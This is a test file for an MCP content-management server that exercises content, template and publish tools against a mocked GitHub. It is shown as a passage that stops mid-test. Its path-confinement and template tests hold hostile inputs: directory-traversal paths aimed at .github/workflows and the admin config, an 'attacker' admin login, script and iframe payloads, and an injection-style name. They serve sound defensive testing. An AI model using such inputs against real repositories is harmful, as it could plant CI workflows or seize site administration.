// End-to-end tests for the MCP server: the JSON-RPC dispatch (mcp-core) driving a
// real ContentClient against a FAKE GitHub (a stateful in-memory file map behind a
// mocked global fetch). Proves protocol shape + the staging/publish content flow
// without a network or real token.
// Run: node --experimental-strip-types functions/_lib/mcp-core.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { handleMessage, TOOL_LIST } from "./mcp-core.ts";
import { stagingUrlFor } from "./pages-project.ts";
import { ContentClient } from "./lanza-content.ts";

const REPO = { owner: "o", name: "n" };
const b64 = (s) => Buffer.from(s, "utf8").toString("base64");

const SITE = JSON.stringify({ defaultLocale: "en", locales: [{ code: "en" }, { code: "es" }] });
// A BARE ARRAY — the shape the CMS actually commits (admin/src/backend/schema.ts
// saveJson's a Collection[]). This fixture used to wrap it in {collections: […]},
// a shape no writer produces, and the implementation was written to match the
// fixture: every content tool was dead against a real site while the suite was
// green. The trailing `kind: "files"` entry is Settings — folderless, and it must
// not reach the path-confinement check.
const SCHEMA = JSON.stringify([
  { kind: "folder", name: "pages", folder: "content/pages", localized: true, body: "rich" },
  { kind: "folder", name: "authors", folder: "content/authors", localized: false, body: "none" },
  { kind: "files", name: "settings", files: [{ name: "menu", file: "data/menu.json" }] },
]);

// A fresh fake GitHub per test: a Map of repo-path → file text, plus staging state.
function fakeGitHub(seed = {}) {
  const files = new Map(Object.entries(seed));
  let published = false;
  const res = (status, body) =>
    new Response(body === undefined ? null : JSON.stringify(body), {
      status,
      headers: { "content-type": "application/json" },
    });

  globalThis.fetch = async (url, init = {}) => {
    const method = (init.method || "GET").toUpperCase();
    const u = new URL(url);
    const path = decodeURIComponent(u.pathname.replace("/repos/o/n/", ""));
    const body = init.body ? JSON.parse(init.body) : {};

    // Branch head (ensureWorkingBranch): staging + main both exist.
    if (method === "GET" && path.startsWith("git/ref/heads/")) return res(200, { object: { sha: "base-sha" } });

    if (method === "GET" && path.startsWith("contents/")) {
      const p = path.replace(/^contents\//, "");
      if (files.has(p)) return res(200, { content: b64(files.get(p)), sha: `sha-${p}` });
      // Directory listing. Faithful to the Contents API: immediate children only,
      // with `type: "dir"` for the ones that have children of their own — which is
      // what validate_site enumerates templates/ by.
      const under = [...files.keys()].filter((k) => k.startsWith(`${p}/`));
      if (under.length) {
        const kids = new Map();
        for (const k of under) {
          const [head, ...rest] = k.slice(p.length + 1).split("/");
          if (!kids.has(head)) kids.set(head, { type: rest.length ? "dir" : "file", name: head, path: `${p}/${head}` });
        }
        return res(200, [...kids.values()]);
      }
      return res(404, { message: "Not Found" });
    }
    if (method === "PUT" && path.startsWith("contents/")) {
      const p = path.replace(/^contents\//, "");
      files.set(p, Buffer.from(body.content, "base64").toString("utf8"));
      return res(files.has(p) ? 200 : 201, { commit: { sha: "commit-sha" } });
    }
    if (method === "DELETE" && path.startsWith("contents/")) {
      files.delete(path.replace(/^contents\//, ""));
      return res(200, { commit: { sha: "commit-sha" } });
    }
    if (method === "POST" && path === "git/refs") return res(201, {});
    if (method === "POST" && path === "merges") {
      published = true;
      return res(201, { merged: true, sha: "merge-sha" });
    }
    if (method === "GET" && path.startsWith("compare/"))
      return res(200, { files: [{ filename: "content/pages/en/hello.md", status: "added" }] });

    return res(599, { message: `unmocked ${method} ${path}` });
  };
  return {
    files,
    get published() {
      return published;
    },
  };
}

const client = () => new ContentClient(REPO, "tok");
// Parse the JSON payload a tools/call returns in its single text content block.
const toolData = (resp) => JSON.parse(resp.result.content[0].text);

test("initialize returns protocol + serverInfo", async () => {
  fakeGitHub();
  const r = await handleMessage({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18" } }, client());
  assert.equal(r.result.protocolVersion, "2025-06-18");
  assert.equal(r.result.serverInfo.name, "lanza-cms");
  assert.ok(r.result.capabilities.tools);
});

test("tools/list exposes the full surface", async () => {
  const r = await handleMessage({ jsonrpc: "2.0", id: 2, method: "tools/list" }, client());
  const names = r.result.tools.map((t) => t.name);
  for (const n of ["get_site", "list_collections", "get_schema", "describe_site_system", "write_template", "create_content_type", "update_content_type", "write_part", "get_settings", "set_brand", "set_menu", "set_seo", "list_content", "read_content", "create_content", "update_content", "delete_content", "validate_site", "list_changes", "publish"])
    assert.ok(names.includes(n), `missing tool ${n}`);
  assert.equal(TOOL_LIST.length, names.length);
});

test("notifications get no response", async () => {
  const r = await handleMessage({ jsonrpc: "2.0", method: "notifications/initialized" }, client());
  assert.equal(r, null);
});

test("unknown method → -32601", async () => {
  const r = await handleMessage({ jsonrpc: "2.0", id: 3, method: "bogus" }, client());
  assert.equal(r.error.code, -32601);
});

test("get_site reads locales from data/site.json", async () => {
  fakeGitHub({ "data/site.json": SITE });
  const r = await handleMessage(
    { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "get_site" } },
    client(),
    { origin: "https://proj.pages.dev", stagingUrl: "https://staging.proj.pages.dev" },
  );
  assert.deepEqual(toolData(r), {
    defaultLocale: "en",
    locales: ["en", "es"],
    liveUrl: "https://proj.pages.dev",
    stagingUrl: "https://staging.proj.pages.dev",
    productionBranch: "main",
    workingBranch: "staging",
  });
});

// Without an origin (a transport that can't say) the URLs are null, not guessed.
test("get_site reports null URLs when the transport gives no origin", async () => {
  fakeGitHub({ "data/site.json": SITE });
  const r = await handleMessage({ jsonrpc: "2.0", id: 41, method: "tools/call", params: { name: "get_site" } }, client());
  const data = toolData(r);
  assert.equal(data.liveUrl, null);
  assert.equal(data.stagingUrl, null);
});

// A wrong staging URL is worse than an absent one: the agent would send someone to
// review changes on a 404 and they'd conclude the write silently failed.
const TEST_REPO = { owner: "datadefine", name: "mcp-test" };

test("stagingUrlFor reads the project straight off a pages.dev host", async () => {
  assert.equal(await stagingUrlFor("https://proj.pages.dev", "staging"), "https://staging.proj.pages.dev");
  // Already on a branch alias: prefixing again would give staging.staging.…
  assert.equal(await stagingUrlFor("https://staging.proj.pages.dev", "staging"), null);
  // A host merely ENDING in the string isn't Cloudflare's.
  assert.equal(await stagingUrlFor("https://evil-pages.dev", "staging"), null);
  assert.equal(await stagingUrlFor("https://notpages.dev", "staging"), null);
  assert.equal(await stagingUrlFor(null, "staging"), null);
  assert.equal(await stagingUrlFor("", "staging"), null);
  assert.equal(await stagingUrlFor("not a url", "staging"), null);
});

// The custom-domain case. The hostname says nothing about the Pages project, but the
// project name is a pure function of owner/repo, so the URL is still derivable — this
// is what used to return null and leave custom-domain tenants with no review URL.
test("stagingUrlFor derives the project from owner/repo on a custom domain", async () => {
  const url = await stagingUrlFor("https://example.com", "staging", TEST_REPO);
  assert.match(url, /^https:\/\/staging\.mcp-test-[0-9a-f]{12}\.pages\.dev$/);
  // Deterministic — the whole design rests on this.
  assert.equal(url, await stagingUrlFor("https://other.example", "staging", TEST_REPO));
  // A different repo must not collide with it.
  assert.notEqual(url, await stagingUrlFor("https://example.com", "staging", { ...TEST_REPO, name: "other" }));
});

// Derivation describes how the BROKER names a project, not how every project got its
// name. dsottimano/lanza predates the scheme and is plainly `lanza`, so a site must be
// able to say so — otherwise its review links point at a host that does not resolve.
test("stagingUrlFor prefers an explicit pagesProject over derivation", async () => {
  assert.equal(
    await stagingUrlFor("https://lanzacms.com", "staging", { ...TEST_REPO, pagesProject: "lanza" }),
    "https://staging.lanza.pages.dev",
  );
  // It becomes a hostname and lanza.config.json is tenant-writable, so it is
  // validated, not trusted. A bad value yields no link rather than a bad one.
  for (const bad of ["not a project", "-leading", "UPPER", "a".repeat(60), "x.y", "../evil"]) {
    assert.equal(
      await stagingUrlFor("https://lanzacms.com", "staging", { ...TEST_REPO, pagesProject: bad }),
      null,
      `should refuse ${bad}`,
    );
  }
});

// Without a repo identity there is nothing to derive from, and a guess would 404.
test("stagingUrlFor stays null on a custom domain with no repo identity", async () => {
  assert.equal(await stagingUrlFor("https://example.com", "staging"), null);
  assert.equal(await stagingUrlFor("https://www.example.com", "staging", {}), null);
  assert.equal(await stagingUrlFor("https://example.com", "staging", { owner: 1, name: 2 }), null);
});

test("list_collections returns the folder collections, not the files ones", async () => {
  fakeGitHub({ "data/schema.json": SCHEMA });
  const r = await handleMessage({ jsonrpc: "2.0", id: 11, method: "tools/call", params: { name: "list_collections" } }, client());
  const data = toolData(r);
  // The bug this pins: a shape mismatch made this return [] on every real site,
  // which also 404'd resolveCollection and 403'd every entry path.
  assert.deepEqual(
    data.map((c) => c.name),
    ["pages", "authors"],
  );
  assert.deepEqual(data[0], { name: "pages", folder: "content/pages", localized: true, body: "rich" });
});

test("create_content stages a new page with draft:false + derived slug", async () => {
  const gh = fakeGitHub({ "data/site.json": SITE, "data/schema.json": SCHEMA });
  const r = await handleMessage(
    {
      jsonrpc: "2.0",
      id: 5,
      method: "tools/call",
      params: { name: "create_content", arguments: { collection: "pages", title: "Hello World", body_html: "<p>Hi</p>" } },
    },
    client(),
  );
  const data = toolData(r);
  assert.equal(data.created, "content/pages/en/hello-world.md");
  const written = gh.files.get("content/pages/en/hello-world.md");
  assert.match(written, /title: Hello World/);
  assert.match(written, /draft: false/);
  assert.match(written, /<p>Hi<\/p>/);
});

test("read_content round-trips frontmatter + body", async () => {
  // schema.json is required: entry paths are confined to a collection's folder.
  fakeGitHub({
    "data/schema.json": SCHEMA,
    "content/pages/en/about.md": "---\ntitle: About\ndraft: false\n---\n\n<p>About us</p>\n",
  });
  const r = await handleMessage(
    { jsonrpc: "2.0", id: 6, method: "tools/call", params: { name: "read_content", arguments: { path: "content/pages/en/about.md" } } },
    client(),
  );
  const data = toolData(r);
  assert.equal(data.frontmatter.title, "About");
  assert.match(data.body_html, /About us/);
});

test("update_content merges frontmatter and preserves untouched keys", async () => {
  const gh = fakeGitHub({
    "data/schema.json": SCHEMA,
    "content/pages/en/about.md": "---\ntitle: About\ndraft: true\ndescription: keep me\n---\n\n<p>Body</p>\n",
  });
  await handleMessage(
    {
      jsonrpc: "2.0",
      id: 7,
      method: "tools/call",
      params: { name: "update_content", arguments: { path: "content/pages/en/about.md", frontmatter: { draft: false } } },
    },
    client(),
  );
  const written = gh.files.get("content/pages/en/about.md");
  assert.match(written, /draft: false/);
  assert.match(written, /description: keep me/); // preserved
  assert.match(written, /<p>Body<\/p>/); // body preserved (not passed)
});

test("list_content lists a localized folder", async () => {
  fakeGitHub({
    "data/site.json": SITE,
    "data/schema.json": SCHEMA,
    "content/pages/en/a.md": "---\ntitle: A\n---\n",
    "content/pages/en/b.md": "---\ntitle: B\n---\n",
  });
  const r = await handleMessage(
    { jsonrpc: "2.0", id: 8, method: "tools/call", params: { name: "list_content", arguments: { collection: "pages", locale: "en" } } },
    client(),
  );
  const data = toolData(r);
  assert.equal(data.count, 2);
  assert.deepEqual(data.paths.sort(), ["content/pages/en/a.md", "content/pages/en/b.md"]);
});

test("publish merges staging into main", async () => {
  const gh = fakeGitHub();
  const r = await handleMessage({ jsonrpc: "2.0", id: 9, method: "tools/call", params: { name: "publish" } }, client());
  assert.equal(toolData(r).published, true);
  assert.equal(gh.published, true);
});

test("tool errors surface as isError results, not JSON-RPC errors", async () => {
  fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const r = await handleMessage(
    { jsonrpc: "2.0", id: 10, method: "tools/call", params: { name: "list_content", arguments: { collection: "nope" } } },
    client(),
  );
  assert.ok(r.result.isError);
  assert.match(r.result.content[0].text, /Unknown collection/);
});

// ---------------------------------------------------------------------------
// Path confinement. Each case below WROTE OUTSIDE THE CONTENT TREE before the
// guards landed — `encodeURIComponent` does not escape dots, so `..` survived
// encodePath and fetch() normalized it away. Keep these adversarial.
// ---------------------------------------------------------------------------

// The tool call must have failed AND left the fake repo untouched — asserting on
// the error alone would pass even if the write had already happened.
const assertRefused = (resp, gh, pattern) => {
  assert.ok(resp.result.isError, "expected the tool call to be refused");
  assert.match(resp.result.content[0].text, pattern);
  assert.deepEqual(
    [...gh.files.keys()].filter((p) => !p.startsWith("data/")),
    [],
    "a refused call must not write anything",
  );
};

const call = (name, args, id = 99) =>
  handleMessage({ jsonrpc: "2.0", id, method: "tools/call", params: { name, arguments: args } }, client());

test("create_content: a traversing locale cannot escape the content tree", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const r = await call("create_content", {
    collection: "pages",
    title: "pwn",
    locale: "../../.github/workflows",
    body_html: "<p>x</p>",
  });
  assertRefused(r, gh, /Unknown locale/);
});

test("create_content: locale must be one the site declares", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  assertRefused(await call("create_content", { collection: "pages", title: "x", locale: "de" }), gh, /Unknown locale/);
});

test("update_content: cannot rewrite lanza.config.json (the /admin owner file)", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const r = await call("update_content", {
    path: "lanza.config.json",
    frontmatter: { adminLogin: "attacker" },
  });
  assertRefused(r, gh, /outside every content collection|entries are \.md files/);
});

test("update_content: cannot stage a CI workflow via traversal", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const r = await call("update_content", {
    path: "content/pages/../../.github/workflows/pwn.md",
    body_html: "<p>x</p>",
  });
  assertRefused(r, gh, /traversal is not allowed/);
});

test("read_content: cannot escape the repo namespace onto another API endpoint", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  assertRefused(await call("read_content", { path: "../../../../user" }), gh, /traversal is not allowed/);
});

test("read_content: percent-encoded traversal is refused too", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  assertRefused(
    await call("read_content", { path: "content/pages/%2e%2e/%2e%2e/lanza.config.json" }),
    gh,
    /percent-encoding is not allowed/,
  );
});

test("delete_content: confined to collection folders", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  assertRefused(await call("delete_content", { path: "astro.config.mjs" }), gh, /entries are \.md files/);
});

test("delete_content: a .md outside any collection is still refused", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  assertRefused(await call("delete_content", { path: "README.md" }), gh, /outside every content collection/);
});

test("create_content: refuses to silently overwrite an existing entry", async () => {
  const gh = fakeGitHub({
    "data/schema.json": SCHEMA,
    "data/site.json": SITE,
    "content/pages/en/about.md": "---\ntitle: About\n---\n\n<p>IMPORTANT</p>\n",
  });
  const r = await call("create_content", { collection: "pages", title: "About", body_html: "<p>DEFACED</p>" });
  assert.ok(r.result.isError);
  assert.match(r.result.content[0].text, /already exists/);
  assert.match(gh.files.get("content/pages/en/about.md"), /IMPORTANT/, "the existing entry must survive");
});

test("legitimate entry paths still work after the guards", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const created = await call("create_content", { collection: "pages", title: "Hello There", body_html: "<p>Hi</p>" });
  assert.equal(toolData(created).created, "content/pages/en/hello-there.md");
  // non-localized collection, and a second locale the site declares
  assert.equal(
    toolData(await call("create_content", { collection: "authors", title: "Jo" })).created,
    "content/authors/jo.md",
  );
  assert.equal(
    toolData(await call("create_content", { collection: "pages", title: "Hola", locale: "es" })).created,
    "content/pages/es/hola.md",
  );
  assert.match(toolData(await call("read_content", { path: "content/pages/en/hello-there.md" })).body_html, /Hi/);
  assert.ok(gh.files.has("content/pages/en/hello-there.md"));
});

// data/schema.json is NOT a security boundary. create_content builds its path from a
// collection's `folder` instead of checking one with assertEntryPath, so a hostile
// folder used to turn "create an entry" into "write a file there" — and that file is
// writable through /admin/api/gh and the CMS content-type editor.
test("a collection whose folder escapes content/ is invisible, and nothing is written", async () => {
  const HOSTILE = JSON.stringify([
    { kind: "folder", name: "pages", folder: "content/pages", localized: true, body: "rich" },
    { kind: "folder", name: "routes", folder: "frontend/pages", localized: false, body: "rich" },
    { kind: "folder", name: "ci", folder: ".github/workflows", localized: false, body: "rich" },
    { kind: "folder", name: "root", folder: "", localized: false, body: "rich" },
    { kind: "folder", name: "up", folder: "content/../.github", localized: false, body: "rich" },
    { kind: "folder", name: "sneaky", folder: "contentious", localized: false, body: "rich" },
  ]);
  const gh = fakeGitHub({ "data/schema.json": HOSTILE, "data/site.json": SITE });

  for (const collection of ["routes", "ci", "root", "up", "sneaky"]) {
    const r = await call("create_content", { collection, title: "pwn", body_html: "<p>x</p>" });
    assert.ok(r.result?.isError, `${collection} must not resolve`);
    // An error result carries plain text, not JSON — don't use toolData() here.
    assert.match(r.result.content[0].text, /Unknown collection/);
  }
  // Nothing outside content/ exists, and the prefix look-alike was not created either.
  for (const k of gh.files.keys()) {
    assert.ok(
      k.startsWith("content/") || k.startsWith("data/"),
      `nothing may be written outside content/: ${k}`,
    );
  }
  // list_collections must not advertise them either.
  const listed = toolData(await call("list_collections"));
  assert.deepEqual(listed.map((c) => c.name), ["pages"]);
  // The legitimate collection in the same file still works — one hostile entry must
  // not disable the site.
  assert.equal(
    toolData(await call("create_content", { collection: "pages", title: "Fine" })).created,
    "content/pages/en/fine.md",
  );
});

test("a null JSON-RPC message is -32600, not a crash", async () => {
  fakeGitHub();
  const r = await handleMessage(null, client());
  assert.equal(r.error.code, -32600);
  // and one bad element must not take down a whole batch
  const batch = await Promise.all([null, { jsonrpc: "2.0", id: 1, method: "ping" }].map((m) => handleMessage(m, client())));
  assert.equal(batch[1].result && typeof batch[1].result, "object");
});

// ---------------------------------------------------------------------------
// The site system over MCP. The point of both tools is that an agent can learn the
// composition contract and check its own work WITHOUT a checkout — until these
// existed, every rule in docs/site-system.md was reachable only from a terminal.
// ---------------------------------------------------------------------------

const callData = async (name, args = {}) => toolData(await call(name, args, 90));

test("describe_site_system serves the contract, without touching GitHub", async () => {
  // No fakeGitHub(): any network call at all fails the test, which is the claim.
  globalThis.fetch = async () => {
    throw new Error("describe_site_system must not make a request");
  };
  const c = await callData("describe_site_system");
  assert.match(c.rule, /may only reference names the layer below/);
  assert.deepEqual(c.positions.map((p) => p.id).sort(), ["detail", "list", "page"]);
  assert.ok(c.widgets.includes("slots"));
  assert.ok(c.checks.some((k) => k.code === "undeclared-slot"));
});

// A site whose template misspells its own field — the canonical silent failure.
const BROKEN_SITE = {
  "data/schema.json": SCHEMA,
  "templates/event/template.html": "<h1>{{ vneue }}</h1>",
  "templates/event/fields.json": JSON.stringify({
    name: "event",
    fields: [{ name: "venue", label: "Venue", widget: "string" }],
  }),
};

test("validate_site catches a misspelled placeholder", async () => {
  fakeGitHub(BROKEN_SITE);
  const r = await callData("validate_site");
  assert.equal(r.ok, false);
  assert.deepEqual(r.checked, ["event"]);
  assert.ok(r.problems.some((p) => p.code === "undeclared-slot" && p.message.includes("vneue")));
  // …and the other half of the same mistake: an input nobody prints.
  assert.ok(r.problems.some((p) => p.code === "unused-field" && p.message.includes("venue")));
});

test("validate_site reports a clean site as ok", async () => {
  fakeGitHub({
    "data/schema.json": SCHEMA,
    "templates/event/template.html": "<h1>{{ venue }}</h1>",
    "templates/event/fields.json": JSON.stringify({
      name: "event",
      fields: [{ name: "venue", label: "Venue", widget: "string" }],
    }),
  });
  const r = await callData("validate_site");
  assert.equal(r.ok, true);
  assert.deepEqual(r.problems, []);
});

test("validate_site scopes to one template", async () => {
  fakeGitHub({
    ...BROKEN_SITE,
    "templates/other/template.html": "<p>{{ nope }}</p>",
    "templates/other/fields.json": JSON.stringify({ name: "other", fields: [] }),
  });
  const r = await callData("validate_site", { template: "other" });
  assert.deepEqual(r.checked, ["other"]);
  assert.ok(r.problems.every((p) => !p.where.includes("event")));
});

test("validate_site names a route into a template that does not exist", async () => {
  fakeGitHub({
    "data/schema.json": JSON.stringify([
      { kind: "folder", name: "events", folder: "content/events", fields: [], route: { base: "events", template: "event" } },
    ]),
  });
  const r = await callData("validate_site");
  assert.ok(r.problems.some((p) => p.code === "route-template-missing"));
});

// ---------------------------------------------------------------------------
// write_template. Every refusal here asserts BOTH halves — the call failed AND the
// repo is untouched — because a half-applied template (markup with no fields, or
// fields with no markup) is broken in a way neither the owner nor the agent can see.
// ---------------------------------------------------------------------------

const callRaw = async (name, args) => await call(name, args, 91);
const isError = (r) => r.result.isError === true;
const errText = (r) => r.result.content[0].text;

// A fresh object per call: write_template must not mutate what it is handed, and a
// shared literal would hide it if it did.
const goodFields = () => ({ fields: [{ name: "venue", label: "Venue", widget: "string" }] });

test("write_template writes both files and fills in fields.json's name", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA });
  const r = await callData("write_template", {
    name: "event",
    template_html: "<h1>{{ venue }}</h1>",
    fields: goodFields(),
  });
  assert.deepEqual(r.written, ["templates/event/template.html", "templates/event/fields.json"]);
  assert.equal(gh.files.get("templates/event/template.html"), "<h1>{{ venue }}</h1>");
  // The folder is the authority: a mismatch renders "Unknown template" on a live URL.
  assert.equal(JSON.parse(gh.files.get("templates/event/fields.json")).name, "event");
});

test("write_template refuses a misspelled placeholder and writes NOTHING", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA });
  const before = gh.files.size;
  const r = await callRaw("write_template", {
    name: "event",
    template_html: "<h1>{{ vneue }}</h1>",
    fields: goodFields(),
  });
  assert.ok(isError(r));
  assert.match(errText(r), /undeclared-slot/);
  assert.equal(gh.files.size, before, "a refused write must leave the repo untouched");
});

test("write_template refuses markup a browser would act on, and writes NOTHING", async () => {
  for (const html of [
    `<h1>{{ venue }}</h1><script>fetch("/admin/api/gh")</script>`,
    `<h1 onclick="x()">{{ venue }}</h1>`,
    `<h1>{{ venue }}</h1><iframe src="/admin/"></iframe>`,
  ]) {
    const gh = fakeGitHub({ "data/schema.json": SCHEMA });
    const before = gh.files.size;
    const r = await callRaw("write_template", { name: "event", template_html: html, fields: goodFields() });
    assert.ok(isError(r), `should refuse: ${html}`);
    assert.match(errText(r), /template-(executes-js|embeds-document)/);
    assert.equal(gh.files.size, before, "a refused write must leave the repo untouched");
  }
});

test("write_template still accepts a template's own <style> and placeholders", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA });
  const r = await callData("write_template", {
    name: "event",
    template_html: `<style>.ev{background:url(/i.png)}</style><a class="ev" href="{{ link }}">{{ venue }}</a>`,
    fields: { fields: [...goodFields().fields, { name: "link", label: "Link", widget: "string" }] },
  });
  assert.equal(r.written.length, 2);
  assert.ok(!("warnings" in r) || !r.warnings.some((w) => w.includes("template-")), r.warnings?.join());
  assert.equal(gh.files.has("templates/event/template.html"), true);
});

test("write_template refuses a name that is not a single kebab segment", async () => {
  for (const name of ["../evil", "Event", "a/b", "ev..t", ""]) {
    const gh = fakeGitHub({ "data/schema.json": SCHEMA });
    const before = gh.files.size;
    const r = await callRaw("write_template", { name, template_html: "<p>{{ venue }}</p>", fields: goodFields() });
    assert.ok(isError(r), `should refuse name ${JSON.stringify(name)}`);
    assert.equal(gh.files.size, before);
  }
});

test("write_template checks a listing against the collection it lists", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA });
  const before = gh.files.size;
  const r = await callRaw("write_template", {
    name: "page-index",
    position: "list",
    template_html: "{{#each entries}}<a href={{url}}>{{ nosuchfield }}</a>{{/each}}",
    fields: { fields: [], listing: { of: "pages", item: ["nosuchfield"] } },
  });
  assert.ok(isError(r));
  assert.match(errText(r), /listing-unknown-field/);
  assert.equal(gh.files.size, before);
});

test("write_template rejects a fields.json name that disagrees with the folder", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA });
  const r = await callRaw("write_template", {
    name: "event",
    template_html: "<h1>{{ venue }}</h1>",
    fields: { ...goodFields(), name: "different" },
  });
  assert.ok(isError(r));
  assert.equal(gh.files.size, 1);
});

// ---------------------------------------------------------------------------
// create_content_type. The schema is compiled into code the build imports, so every
// refusal asserts the file was not touched — a bad model that reaches data/schema.json
// fails the tenant's DEPLOY, not this call.
// ---------------------------------------------------------------------------

const withTemplate = (extra = {}) => ({
  "data/schema.json": SCHEMA,
  "data/site.json": SITE,
  "templates/property/template.html": "<h1>{{ address }}</h1><p>{{ price }}</p>",
  "templates/property/fields.json": JSON.stringify({
    name: "property",
    fields: [
      { name: "address", label: "Address", widget: "string" },
      { name: "price", label: "Price", widget: "string" },
    ],
  }),
  ...extra,
});

const schemaIn = (gh) => JSON.parse(gh.files.get("data/schema.json"));

test("create_content_type derives its fields from the template, not from arguments", async () => {
  const gh = fakeGitHub(withTemplate());
  const r = await callData("create_content_type", {
    name: "properties",
    label: "Properties",
    fieldsFrom: "property",
    route: { base: "properties", template: "property" },
  });
  assert.deepEqual(r.fields, ["address", "price"], "fields come from templates/property/fields.json");
  assert.equal(r.url, "/properties/");
  const added = schemaIn(gh).find((c) => c.name === "properties");
  // Derived, never accepted: this is what create_content builds a write path from.
  assert.equal(added.folder, "content/properties");
  assert.deepEqual(added.route, { base: "properties", template: "property" });
});

test("create_content_type refuses a route base a built-in route already owns", async () => {
  for (const base of ["posts", "admin", "api", "_astro"]) {
    const gh = fakeGitHub(withTemplate());
    const before = gh.files.get("data/schema.json");
    const r = await callRaw("create_content_type", {
      name: "properties",
      label: "Properties",
      fieldsFrom: "property",
      route: { base, template: "property" },
    });
    assert.ok(isError(r), `should refuse base ${base}`);
    assert.equal(gh.files.get("data/schema.json"), before, "schema.json must be untouched");
  }
});

test("create_content_type refuses a base that would collide with a locale prefix", async () => {
  const gh = fakeGitHub(withTemplate());
  const before = gh.files.get("data/schema.json");
  const r = await callRaw("create_content_type", {
    name: "properties",
    label: "Properties",
    fieldsFrom: "property",
    route: { base: "es", template: "property" },
  });
  assert.ok(isError(r));
  assert.equal(gh.files.get("data/schema.json"), before);
});

test("create_content_type refuses a name that is not a plain identifier", async () => {
  for (const name of ["my-type", "2things", "a b", "x); evil()"]) {
    const gh = fakeGitHub(withTemplate());
    const before = gh.files.get("data/schema.json");
    const r = await callRaw("create_content_type", { name, label: "X", fieldsFrom: "property" });
    assert.ok(isError(r), `should refuse name ${JSON.stringify(name)}`);
    assert.equal(gh.files.get("data/schema.json"), before);
  }
});

test("create_content_type refuses a route into a template that does not exist", async () => {
  const gh = fakeGitHub(withTemplate());
  const before = gh.files.get("data/schema.json");
  const r = await callRaw("create_content_type", {
    name: "properties",
    label: "Properties",
    fieldsFrom: "property",
    route: { base: "properties", template: "nosuchtemplate" },
  });
  assert.ok(isError(r));
  assert.match(errText(r), /route-template-missing/);
  assert.equal(gh.files.get("data/schema.json"), before, "a live URL rendering 'Unknown template' must not ship");
});

test("create_content_type never overwrites an existing collection", async () => {
  const gh = fakeGitHub(withTemplate());
  const before = gh.files.get("data/schema.json");
  const r = await callRaw("create_content_type", { name: "pages", label: "Pages", fieldsFrom: "property" });
  assert.ok(isError(r));
  assert.equal(gh.files.get("data/schema.json"), before);
});

// `note` belongs to stagedNote(); a second key by that name would be spread away and
// the one line that matters when a type has no URL would vanish. It did, once.
test("create_content_type says so when a type has no URL", async () => {
  const gh = fakeGitHub(withTemplate());
  const r = await callData("create_content_type", { name: "properties", label: "Properties", fieldsFrom: "property" });
  assert.match(r.next, /NO URL/);
  assert.equal(schemaIn(gh).find((c) => c.name === "properties").route, undefined);
});

test("create_content_type requires the template to exist first", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const r = await callRaw("create_content_type", { name: "properties", label: "Properties", fieldsFrom: "property" });
  assert.ok(isError(r));
  assert.match(errText(r), /write_template/);
});

// ---------------------------------------------------------------------------
// The whole point, in one test: "build me a real estate site", driven only through
// MCP by something with no checkout and no terminal. If this ever stops passing, the
// pitch is not true any more.
// ---------------------------------------------------------------------------

test("an agent can build a real-estate site with no checkout", async () => {
  const gh = fakeGitHub({
    "data/schema.json": JSON.stringify([
      { kind: "folder", name: "pages", folder: "content/pages", localized: true, body: "rich" },
    ]),
    "data/site.json": SITE,
  });

  // 1. Learn the contract from the server, not from a markdown file it was never given.
  const contract = await callData("describe_site_system");
  assert.ok(contract.positions.some((p) => p.id === "detail"));
  assert.ok(contract.untrustedAuthorRefusals.codes.includes("template-executes-js"));

  // 2. The detail template. Structure and CSS only — no script needed, because the
  //    engine renders at build time. This is the claim the whole design rests on.
  const detail = await callData("write_template", {
    name: "property",
    position: "detail",
    template_html: `<style>.pr{display:grid}</style>
<article class="pr">
  <h1>{{ address }}</h1>
  <p class="pr-price">{{ price }}</p>
  <p>{{ bedrooms }} bed · {{ neighbourhood }}</p>
  {{#if soldSubjectToContract}}<p class="pr-flag">Sold subject to contract</p>{{/if}}
  <div class="pr-gallery">{{#each gallery}}<img src="{{ image }}" alt="{{ caption }}">{{/each}}</div>
  {{{ body }}}
</article>`,
    fields: {
      body: true,
      fields: [
        { name: "address", label: "Address", widget: "string" },
        { name: "price", label: "Price", widget: "string" },
        { name: "bedrooms", label: "Bedrooms", widget: "number" },
        { name: "neighbourhood", label: "Neighbourhood", widget: "string" },
        { name: "soldSubjectToContract", label: "Sold STC", widget: "boolean" },
        {
          name: "gallery",
          label: "Gallery",
          widget: "list",
          fields: [
            { name: "image", label: "Image", widget: "image" },
            { name: "caption", label: "Caption", widget: "string" },
          ],
        },
      ],
    },
  });
  assert.equal(detail.written.length, 2);

  // 3. The listing. `properties` does not exist yet — that is reported, not refused,
  //    because the type's fields come from the detail template and its route names this
  //    listing, so requiring both to exist first would deadlock.
  const index = await callData("write_template", {
    name: "property-index",
    position: "list",
    template_html: `<h1>{{ heading }}</h1>
{{#if isEmpty}}<p>Nothing listed yet.</p>{{/if}}
<ul>{{#each entries}}<li><a href="{{ url }}">{{ address }} — {{ price }}</a></li>{{/each}}</ul>`,
    fields: {
      fields: [{ name: "heading", label: "Heading", widget: "string", default: "Properties" }],
      listing: { of: "properties", item: ["address", "price"] },
    },
  });
  assert.ok(index.warnings.some((w) => w.includes("listing-unknown-collection")));

  // 4. The content type — fields derived from the template, URL from the route.
